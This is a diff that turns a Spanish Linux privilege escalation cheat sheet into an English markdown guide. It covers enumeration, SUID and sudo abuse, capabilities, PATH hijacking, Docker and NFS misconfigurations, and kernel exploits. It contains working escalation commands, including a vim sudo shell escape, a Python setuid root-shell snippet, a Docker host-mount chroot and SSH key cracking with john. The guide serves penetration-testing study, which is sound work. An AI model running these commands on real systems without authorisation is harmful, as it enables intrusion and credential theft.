@@ -1,217 +1,413 @@
-## Content:
+# Linux Privilege Escalation
+
+## Content
 - Enumeration
+- System Information
+- User Enumeration
+- Process Enumeration
+- Network Enumeration
+- File Permissions
 - SUID
 - Sudo Permissions
 - Cron Jobs
-- Capabilities
-- Weak Permissions
-- SSH
-- Kernel Exploits
-- NFS
-- Docker / LXC
-- Environment Variables
+- Linux Capabilities
 - PATH Hijacking
-- Wildcards Abuse
+- Environment Variables
+- SSH Keys
 - Credential Hunting
-- Sensitive Files
-- Log Files
+- NFS
+- Docker
+- LXC
+- Kernel Exploits
 - Services
 - Scripts Analysis
-- Password Reuse
 - Tools
-- References
 
-## 1. Enumeration 
+---
 
-Antes de explotar nada:
-- whoami
-- id
-- hostname
-- uname -a
-- cat /etc/os-release
+# 1. Enumeration
 
-Usuarios:
-- cat /etc/passwd
-- cat /etc/group
-- last
-- w
+Gather information before exploiting anything:
 
-Procesos:
-- ps aux
-- ps aux | grep root
+```bash
+whoami
+id
+hostname
+uname -a
+cat /etc/os-release
+sudo -l
+```
 
-Red:
- - ip a
-- netstat -tulpn
-- ss -tulpn
+Check:
+- OS version
+- Current user privileges
+- Groups
+- Running services
+- Network configuration
 
-## 2. SUID
+---
 
-Buscar SUID:
+# 2. User Enumeration
 
-- find / -perm -4000 -type f 2>/dev/null
+Current user:
 
-Buscar binarios vulnerables:
+```bash
+whoami
+id
+groups
+```
 
-- find / -perm -u=s -type f 2>/dev/null
+Users:
 
-Ejemplos:
-/usr/bin/python
-/usr/bin/vim
-/usr/bin/nmap
-/usr/bin/find
+```bash
+cat /etc/passwd
+```
 
-## 3. Sudo Permissions
-- sudo -l
+Login history:
 
-Buscar:
+```bash
+last
+w
+```
+
+Look for:
+- Users with shells
+- Service accounts
+- Interesting usernames
+
+---
+
+# 3. System Information
+
+Kernel:
+
+```bash
+uname -r
+uname -a
+```
+
+Search exploits:
+
+```bash
+searchsploit linux kernel <version>
+```
+
+Common vulnerabilities:
+- DirtyCow
+- DirtyPipe
+- OverlayFS
+- PwnKit
+
+---
+
+# 4. SUID
+
+Find SUID binaries:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Alternative:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Useful binaries:
+
+```
+vim
+find
+nmap
+python
+bash
+```
+
+Reference:
+
+https://gtfobins.github.io/
+
+---
+
+# 5. Sudo Permissions
+
+Check sudo privileges:
+
+```bash
+sudo -l
+```
+
+Look for:
 - NOPASSWD
-- comandos permitidos
-- versiones vulnerables
+- Vulnerable binaries
+- Misconfigured permissions
 
-Ejemplo:
-- sudo vim
+Example:
 
-Escalada:
-- :!bash
+```bash
+sudo vim
+```
 
-## 4. Cron Jobs
+Escape:
 
-Buscar tareas:
-- cat /etc/crontab
-- ls -la /etc/cron*
+```vim
+:!bash
+```
 
-Buscar scripts:
-- find / -name "*.sh" 2>/dev/null
+---
 
-Puntos a revisar:
-- scripts ejecutados como root
-- permisos de escritura
-- PATH inseguro
+# 6. Cron Jobs
 
-## 5. Linux Capabilities
+Enumerate:
 
-Buscar:
-- getcap -r / 2>/dev/null
+```bash
+cat /etc/crontab
+ls -la /etc/cron*
+```
 
-Ejemplo:
-- /usr/bin/python3 cap_setuid+ep
+Search scripts:
 
-Puede permitir:
+```bash
+find / -name "*.sh" 2>/dev/null
+```
+
+Look for:
+- Root execution
+- Writable scripts
+- Weak permissions
+
+---
+
+# 7. Linux Capabilities
+
+Find capabilities:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+Example:
+
+```
+python3 = cap_setuid+ep
+```
+
+Possible abuse:
+
+```python
 import os
 os.setuid(0)
 os.system("/bin/bash")
+```
 
-## 6. Weak Permissions:
-Archivos modificables:
+---
+
+# 8. Weak Permissions
+
+Writable files:
+
+```bash
 find / -writable -type f 2>/dev/null
+```
 
-Directorios:
+Writable directories:
+
+```bash
 find / -writable -type d 2>/dev/null
+```
 
-Ejemplos:
-- scripts root modificables
-- archivos de configuración
-- servicios
+Check:
+- Root scripts
+- Configuration files
+- Service files
 
-## 7. PATH Hijacking
+---
 
-Comprobar PATH:
-- echo $PATH
+# 9. PATH Hijacking
 
-Buscar scripts:
-- strings /path/to/file
+Check PATH:
 
-Script:
-- service apache restart
+```bash
+echo $PATH
+```
 
-Si no usa ruta absoluta:
-- /usr/bin/service
+Vulnerable example:
 
-## 8. Environment Variables
+```bash
+service apache restart
+```
 
-Variables interesantes:
-- env
+If the script does not use absolute paths, create a malicious binary with the same name.
 
-Buscar:
-- LD_PRELOAD
-- LD_LIBRARY_PATH
+---
 
-Ejemplo:
-- sudo LD_PRELOAD=/tmp/library.so program
+# 10. Credential Hunting
 
-## 9. Kernel Exploits
+Search passwords:
 
-Información:
-- uname -r
+```bash
+grep -R "password" /home 2>/dev/null
+```
 
-Buscar vulnerabilidades
+Search files:
+
+```bash
+find / -name "*.conf" 2>/dev/null
+find / -name "*.env" 2>/dev/null
+```
+
+Interesting locations:
+
+```
+/home
+/etc
+/var/www
+/opt
+```
+
+---
+
+# 11. SSH Keys
+
+Find keys:
+
+```bash
+find / -name id_rsa 2>/dev/null
+```
+
+Check permissions:
+
+```bash
+ls -la ~/.ssh/
+```
+
+Crack:
+
+```bash
+ssh2john id_rsa > hash.txt
+john hash.txt
+```
+
+---
+
+# 12. Docker
+
+Check groups:
+
+```bash
+id
+```
+
+If docker access exists:
+
+```bash
+docker images
+```
+
+Privilege escalation:
+
+```bash
+docker run -v /:/mnt -it alpine chroot /mnt bash
+```
+
+---
+
+# 13. NFS
+
+Check exports:
+
+```bash
+cat /etc/exports
+```
+
+Dangerous:
+
+```
+no_root_squash
+```
+
+Enumerate:
+
+```bash
+showmount -e <IP>
+```
+
+---
+
+# 14. Kernel Exploits
+
+Check kernel:
+
+```bash
+uname -r
+```
+
+Search:
+
+```bash
+searchsploit linux kernel
+```
+
+Common:
 - DirtyPipe
 - DirtyCow
 - OverlayFS
 
-Herramientas:
-- linux-exploit-suggester
-- LES
+---
 
-## 10. Docker / LXC
+# 15. Enumeration Tools
 
-Comprobar:
-- id
+## LinPEAS
 
-Si aparece:
-- docker
-puede ser escalada.
+```bash
+./linpeas.sh
+```
 
-Ejemplo:
-- docker images
-- docker run -v /:/mnt alpine chroot /mnt bash
+## Linux Exploit Suggester
 
-11. NFS
-Buscar:
-- cat /etc/exports
+```bash
+./linux-exploit-suggester.sh
+```
 
-Problema:
-- no_root_squash
-Puede permitir root remoto.
+## Other tools
 
-## 12. Credential Hunting
-
-Buscar:
-- grep -R "password" /home 2>/dev/null
-
-Archivos:
-- find / -name "*.conf"
-- find / -name "*.txt"
-- find / -name "*.bak"
-
-Sitios:
-- .bash_history
-- .config
-- .ssh
-- .env
-
-## 13. SSH
-
-Buscar claves:
-- find / -name id_rsa 2>/dev/null
-
-Permisos:
-- ls -la ~/.ssh/
-
-Crack:
-- ssh2john id_rsa
-- john hash
-
-14. Tools
-
-Añadir una sección:
-
-## 14. Tools
-- LinPEAS
-- Linux Exploit Suggester
 - pspy
-- GTFOBins
 - LSE
+- GTFOBins
 - ltrace
 - strace
+
+---
+
+# Privilege Escalation Workflow
+
+```
+Enumeration
+    |
+System Information
+    |
+User Privileges
+    |
+SUID / Sudo
+    |
+Cron Jobs
+    |
+Capabilities
+    |
+Credentials
+    |
+Services
+    |
+Exploit
+    |
+Root Access
+```
+
+---
+
+# References
+
+- https://gtfobins.github.io/
+- https://github.com/carlospolop/PEASS-ng
+- https://github.com/DominicBreuker/pspy
